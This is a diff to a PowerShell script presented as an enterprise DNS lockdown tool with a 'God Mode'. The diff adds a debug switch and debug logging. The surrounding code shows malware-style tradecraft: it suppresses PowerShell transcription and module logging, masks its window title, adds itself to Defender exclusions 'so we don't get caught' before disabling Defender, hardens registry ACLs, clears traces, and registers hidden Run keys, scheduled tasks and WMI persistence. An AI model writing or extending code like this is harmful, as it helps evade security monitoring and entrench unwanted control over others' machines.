@@ -26,7 +26,8 @@ param (
     [switch]$Verbose,
     [switch]$InstallGodMode,
     [switch]$UninstallGodMode,
-    [switch]$DumpLogs
+    [switch]$DumpLogs,
+    [switch]$DebugMode
 )
 
 # ============================================================================
@@ -81,6 +82,8 @@ if (-not $Principal.IsInRole($Role)) {
         if ($Lock) { $ArgsString += " -Lock" }
         if ($Unlock) { $ArgsString += " -Unlock" }
         if ($SilentLock) { $ArgsString += " -SilentLock" }
+        if ($DebugMode) { $ArgsString += " -DebugMode" }
+        if ($Verbose) { $ArgsString += " -Verbose" }
 
         $ProcessInfo.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" $ArgsString"
         $ProcessInfo.Verb = "runAs"
@@ -105,6 +108,7 @@ $ScriptDir = Split-Path -Parent -Path $PSCommandPath
 if (-not $ScriptDir) { $ScriptDir = $PWD.Path }
 # Log to a writable location (not the hardened install dir) so admin can still write
 $LogFile = Join-Path -Path $env:TEMP -ChildPath "DNS_Lockdown_Enterprise.log"
+$DebugLogFile = Join-Path -Path $env:TEMP -ChildPath "DNS_Lockdown_Enterprise.debug.log"
 
 $GodModeFlagFile   = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syscache"
 $GodModeLogFile    = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syslog"
@@ -124,6 +128,48 @@ function Write-Log {
     # Only print to screen if we are NOT running silently in the background
     if (-not $SilentLock) {
         Write-Host "[$Type] $Message" -ForegroundColor $Color
+    }
+}
+
+function Write-DebugLog {
+    param (
+        [string]$FunctionName,
+        [string]$Action = "ENTRY", # ENTRY, EXIT, ERROR, WARN, INFO
+        [string]$Message = "",
+        [System.Management.Automation.ErrorRecord]$ErrorRecord = $null
+    )
+    $TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    $Line = $MyInvocation.ScriptLineNumber
+    try {
+        if ($ErrorRecord) {
+            $Stack = $ErrorRecord.ScriptStackTrace -replace "`r`n", " | "
+            $Detail = "[$TimeStamp] [DEBUG] [$Action] [$FunctionName] [$Line] $Message | Exception: $($ErrorRecord.Exception.Message) | Stack: $Stack"
+        } else {
+            $Detail = "[$TimeStamp] [DEBUG] [$Action] [$FunctionName] [$Line] $Message"
+        }
+        $Detail | Out-File -FilePath $DebugLogFile -Append -Encoding UTF8 -ErrorAction SilentlyContinue
+        # Also mirror to main log if DebugMode is enabled
+        if ($DebugMode -or $Verbose) {
+            $Detail | Out-File -FilePath $LogFile -Append -Encoding UTF8 -ErrorAction SilentlyContinue
+        }
+    } catch {}
+}
+
+function Invoke-WithDebug {
+    param (
+        [string]$FunctionName,
+        [scriptblock]$ScriptBlock
+    )
+    Write-DebugLog -FunctionName $FunctionName -Action "ENTRY"
+    try {
+        $Result = & $ScriptBlock
+        Write-DebugLog -FunctionName $FunctionName -Action "EXIT" -Message "Success"
+        return $Result
+    } catch {
+        $ErrorRecord = $_
+        Write-DebugLog -FunctionName $FunctionName -Action "ERROR" -Message "Exception occurred" -ErrorRecord $ErrorRecord
+        Write-Log -Message "[$FunctionName] Error: $($ErrorRecord.Exception.Message)" -Type "ERROR" -Color Red
+        throw $ErrorRecord
     }
 }
 
@@ -424,6 +470,7 @@ function Restore-RegistryKey {
 # ============================================================================
 
 function Enable-DNSLock {
+    Write-DebugLog -FunctionName "Enable-DNSLock" -Action "ENTRY"
     Write-Log -Message "Initiating Targeted Lock (Admin/SYSTEM Only on IPv4 & IPv6)..." -Type "ACTION" -Color Magenta
 
     foreach ($Adapter in $Adapters) {
@@ -547,8 +594,10 @@ function Enable-DNSLock {
     if ($Firefox -and $Firefox.Enabled -ne 0) { $FailedCount++; Write-Log -Message "Firefox DoH not disabled." -Type "ERROR" -Color Red }
     if ($FailedCount -eq 0) {
         Write-Host "[SUCCESS] ALL DNS LOCKS DEPLOYED!" -ForegroundColor Green
+        Write-DebugLog -FunctionName "Enable-DNSLock" -Action "EXIT" -Message "Success, FailedCount=0"
     } else {
         Write-Host "[PARTIAL] DNS LOCKS DEPLOYED WITH ERRORS! ($FailedCount items failed)" -ForegroundColor Yellow
+        Write-DebugLog -FunctionName "Enable-DNSLock" -Action "EXIT" -Message "Partial, FailedCount=$FailedCount"
     }
 }
 
@@ -557,6 +606,7 @@ function Enable-DNSLock {
 # ============================================================================
 
 function Disable-DNSLock {
+    Write-DebugLog -FunctionName "Disable-DNSLock" -Action "ENTRY"
     Write-Log -Message "Initiating Total Unlock (Ångra)..." -Type "ACTION" -Color Magenta
 
     # Restore hardened registry ACLs before attempting to modify values
@@ -632,6 +682,7 @@ function Disable-DNSLock {
     ipconfig /flushdns | Out-Null
 
     Write-Log -Message "System restored to default Windows behaviors." -Type "SUCCESS" -Color Green
+    Write-DebugLog -FunctionName "Disable-DNSLock" -Action "EXIT" -Message "Success"
 
     # Final status verification
     $FailedCount = 0
@@ -680,6 +731,7 @@ function Disable-DNSLock {
 # ============================================================================
 
 function Install-Persistence {
+    Write-DebugLog -FunctionName "Install-Persistence" -Action "ENTRY"
     Write-Log -Message "Installing DNS-Guard to System ($InstallDir)..." -Type "ACTION" -Color Yellow
 
     # 0. Installation Gate: Prevent overwriting existing installs
@@ -886,8 +938,10 @@ function Install-Persistence {
     if (-not $WmiConsumer) { Write-Log -Message "WMI event consumer missing." -Type "WARN" -Color Yellow }
     if ($FailedCount -eq 0) {
         Write-Host "[SUCCESS] INSTALLATION COMPLETE!" -ForegroundColor Green
+        Write-DebugLog -FunctionName "Install-Persistence" -Action "EXIT" -Message "Success"
     } else {
         Write-Host "[PARTIAL] INSTALLATION COMPLETE WITH ERRORS! ($FailedCount items missing)" -ForegroundColor Yellow
+        Write-DebugLog -FunctionName "Install-Persistence" -Action "EXIT" -Message "Partial, FailedCount=$FailedCount"
     }
 }
 
@@ -941,6 +995,7 @@ function Invoke-AsSystem {
 }
 
 function Install-GodModePersistence {
+    Write-DebugLog -FunctionName "Install-GodModePersistence" -Action "ENTRY"
     Write-Log -Message "Installing God Mode to System ($GodModeInstallDir)..." -Type "ACTION" -Color Yellow
 
     # Gate: prevent overwrite
@@ -1078,6 +1133,7 @@ function Install-GodModePersistence {
     Write-Log -Message "Integrity hash stored in registry." -Type "INFO" -Color Gray
 
     Write-Log -Message "GOD MODE INSTALLATION COMPLETE!" -Type "SUCCESS" -Color Green
+    Write-DebugLog -FunctionName "Install-GodModePersistence" -Action "EXIT" -Message "Success"
 
     # Final verification
     $FailedCount = 0
@@ -1096,6 +1152,7 @@ function Install-GodModePersistence {
 }
 
 function Uninstall-GodModePersistence {
+    Write-DebugLog -FunctionName "Uninstall-GodModePersistence" -Action "ENTRY"
     $IsInstalled = (Test-Path $GodModeInstallDir) -or (Get-ScheduledTask -TaskName $GodModeTaskName -ErrorAction SilentlyContinue)
     if (-not $IsInstalled) {
         Write-Host "[WARN] God Mode is not installed. Nothing to uninstall." -ForegroundColor Yellow
@@ -1186,6 +1243,7 @@ function Uninstall-GodModePersistence {
     } else {
         Write-Host "`n[PARTIAL] UNINSTALLATION COMPLETE WITH ERRORS! ($FailedCount items failed)" -ForegroundColor Yellow
     }
+    Write-DebugLog -FunctionName "Uninstall-GodModePersistence" -Action "EXIT" -Message "Complete"
 }
 
 function Uninstall-Persistence {
@@ -1562,6 +1620,7 @@ function Clear-RecentTraces {
 }
 
 function Invoke-StealthMode {
+    Write-DebugLog -FunctionName "Invoke-StealthMode" -Action "ENTRY"
     try {
         # Hide window title from casual inspection
         $Host.UI.RawUI.WindowTitle = "Windows PowerShell (x86)"
@@ -1573,10 +1632,15 @@ function Invoke-StealthMode {
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 0 -Force -ErrorAction SilentlyContinue
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0 -Force -ErrorAction SilentlyContinue
         Write-Log -Message "Stealth mode applied: window title masked, PowerShell logging suppressed." -Type "INFO" -Color Gray
-    } catch { Write-Log -Message "Stealth mode partial failure: $_" -Type "WARN" -Color Yellow }
+        Write-DebugLog -FunctionName "Invoke-StealthMode" -Action "EXIT" -Message "Success"
+    } catch {
+        Write-DebugLog -FunctionName "Invoke-StealthMode" -Action "ERROR" -Message "Partial failure" -ErrorRecord $_
+        Write-Log -Message "Stealth mode partial failure: $_" -Type "WARN" -Color Yellow
+    }
 }
 
 function Register-DeepPersistence {
+    Write-DebugLog -FunctionName "Register-DeepPersistence" -Action "ENTRY"
     try {
         # Extra registry Run keys (both HKLM and WOW6432Node)
         $ScriptCmd = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
@@ -1610,33 +1674,53 @@ function Register-DeepPersistence {
         }
         
         Write-Log -Message "Deep persistence registered: extra registry keys, backup tasks, and boot-level WMI." -Type "INFO" -Color Gray
-    } catch { Write-Log -Message "Deep persistence registration failed: $_" -Type "WARN" -Color Yellow }
+        Write-DebugLog -FunctionName "Register-DeepPersistence" -Action "EXIT" -Message "Success"
+    } catch {
+        Write-DebugLog -FunctionName "Register-DeepPersistence" -Action "ERROR" -Message "Registration failed" -ErrorRecord $_
+        Write-Log -Message "Deep persistence registration failed: $_" -Type "WARN" -Color Yellow
+    }
 }
 
 function Export-GodModeLogs {
     param([string]$DestinationFolder = [Environment]::GetFolderPath("Desktop"))
+    Write-DebugLog -FunctionName "Export-GodModeLogs" -Action "ENTRY" -Message "DestinationFolder=$DestinationFolder"
     try {
         $TimeStamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
         $FileName = "GodMode_Dump_$TimeStamp.log"
         $DestPath = Join-Path -Path $DestinationFolder -ChildPath $FileName
-        
+
         $LogContent = @()
-        if (Test-Path $LogFile) { $LogContent += Get-Content -Raw -Path $LogFile -ErrorAction SilentlyContinue }
-        if (Test-Path $GodModeLogFile) { $LogContent += Get-Content -Raw -Path $GodModeLogFile -ErrorAction SilentlyContinue }
-        
-        if ($LogContent.Count -eq 0) {
+        $Header = @("===== ENTERPRISE DNS LOCKOUT / GOD MODE LOG DUMP =====", "Generated: $(Get-Date)", "Script: $PSCommandPath", "PSVersion: $($PSVersionTable.PSVersion)", "User: $([Environment]::UserName)", "Machine: $([Environment]::MachineName)", "===== MAIN LOG =====")
+        $LogContent += $Header -join "`r`n"
+        if (Test-Path $LogFile) { $LogContent += Get-Content -Raw -Path $LogFile -ErrorAction SilentlyContinue } else { $LogContent += "[No main log found]" }
+        $LogContent += "`r`n===== DEBUG LOG ====="
+        if (Test-Path $DebugLogFile) { $LogContent += Get-Content -Raw -Path $DebugLogFile -ErrorAction SilentlyContinue } else { $LogContent += "[No debug log found]" }
+        if (Test-Path $GodModeLogFile) { $LogContent += "`r`n===== GOD MODE LOG ====="; $LogContent += Get-Content -Raw -Path $GodModeLogFile -ErrorAction SilentlyContinue }
+
+        # Error summary from debug log
+        $ErrorCount = 0
+        if (Test-Path $DebugLogFile) {
+            $ErrorCount = (Select-String -Path $DebugLogFile -Pattern "\[ERROR\]" -ErrorAction SilentlyContinue | Measure-Object).Count
+        }
+        $LogContent += "`r`n===== ERROR SUMMARY =====`r`nTotal ERROR entries in debug log: $ErrorCount`r`nDump complete.`r`n"
+
+        if (($LogContent | Measure-Object).Count -eq 0) {
             Write-Host "[WARN] No logs found to dump." -ForegroundColor Yellow
+            Write-DebugLog -FunctionName "Export-GodModeLogs" -Action "EXIT" -Message "No logs found"
             return
         }
-        
+
         $LogContent -join "`r`n" | Out-File -FilePath $DestPath -Encoding UTF8 -Force
-        Write-Host "[SUCCESS] Logs dumped to: $DestPath" -ForegroundColor Green
+        Write-Host "[SUCCESS] Logs dumped to: $DestPath ($ErrorCount error entries captured)" -ForegroundColor Green
+        Write-DebugLog -FunctionName "Export-GodModeLogs" -Action "EXIT" -Message "Success: $DestPath, ErrorCount=$ErrorCount"
     } catch {
+        Write-DebugLog -FunctionName "Export-GodModeLogs" -Action "ERROR" -Message "Failed to dump logs" -ErrorRecord $_
         Write-Host "[ERROR] Failed to dump logs: $_" -ForegroundColor Red
     }
 }
 
 function Enable-DangerousMode {
+    Write-DebugLog -FunctionName "Enable-DangerousMode" -Action "ENTRY"
     Write-Log -Message "Enabling dangerous mode..." -Type "WARN" -Color Yellow
 
     # 0. Add self to Defender exclusions BEFORE disabling it (so we don't get caught)
@@ -1762,9 +1846,11 @@ function Enable-DangerousMode {
     foreach ($Key in $GodModeRegistryKeys) {
         Harden-RegistryKey -Path $Key
     }
+    Write-DebugLog -FunctionName "Enable-DangerousMode" -Action "EXIT" -Message "Complete"
 }
 
 function Disable-DangerousMode {
+    Write-DebugLog -FunctionName "Disable-DangerousMode" -Action "ENTRY"
     Write-Log -Message "Disabling dangerous mode..." -Type "WARN" -Color Yellow
 
     # Restore God Mode registry ACLs before attempting to remove values
@@ -1895,6 +1981,7 @@ function Disable-DangerousMode {
     } catch {}
 
     Write-Log -Message "Dangerous mode disable attempt complete. Reboot strongly recommended for full restoration." -Type "INFO" -Color Yellow
+    Write-DebugLog -FunctionName "Disable-DangerousMode" -Action "EXIT" -Message "Complete"
 }
 
 function Register-StealthTask {
@@ -1939,8 +2026,10 @@ function Elevate-Process {
 }
 
 function Start-Monitoring {
+    Write-DebugLog -FunctionName "Start-Monitoring" -Action "ENTRY"
     if (-not (Test-Path $GodModeFlagFile)) {
         Write-Log -Message "God Mode is not enabled." -Type "ERROR" -Color Red
+        Write-DebugLog -FunctionName "Start-Monitoring" -Action "EXIT" -Message "Aborted: flag file missing"
         return
     }
 
@@ -2000,6 +2089,7 @@ function Start-Monitoring {
             }
         }
         catch {
+            Write-DebugLog -FunctionName "Start-Monitoring" -Action "ERROR" -Message "Loop exception" -ErrorRecord $_
             Write-Log -Message "Monitoring error (recovering in 5s): $_" -Type "ERROR" -Color Red
             Start-Sleep -Seconds 5
         }
@@ -2007,6 +2097,7 @@ function Start-Monitoring {
 }
 
 function Enable-GodMode {
+    Write-DebugLog -FunctionName "Enable-GodMode" -Action "ENTRY"
     "1" | Out-File $GodModeFlagFile -Force
     Register-StealthTask
     Enable-DangerousMode
@@ -2067,9 +2158,11 @@ function Enable-GodMode {
     Invoke-StealthMode
 
     Write-Log -Message "God Mode ENABLED" -Type "WARN" -Color Yellow
+    Write-DebugLog -FunctionName "Enable-GodMode" -Action "EXIT" -Message "Success"
 }
 
 function Disable-GodMode {
+    Write-DebugLog -FunctionName "Disable-GodMode" -Action "ENTRY"
     Remove-Item $GodModeFlagFile -Force -ErrorAction SilentlyContinue
     Unregister-StealthTask
 
@@ -2100,6 +2193,7 @@ function Disable-GodMode {
     } catch { Write-Log -Message "WMI cleanup failed: $_" -Type "WARN" -Color Yellow }
 
     Write-Log -Message "God Mode DISABLED" -Type "WARN" -Color Yellow
+    Write-DebugLog -FunctionName "Disable-GodMode" -Action "EXIT" -Message "Success"
 }
 
 function Show-GodModeStatus {
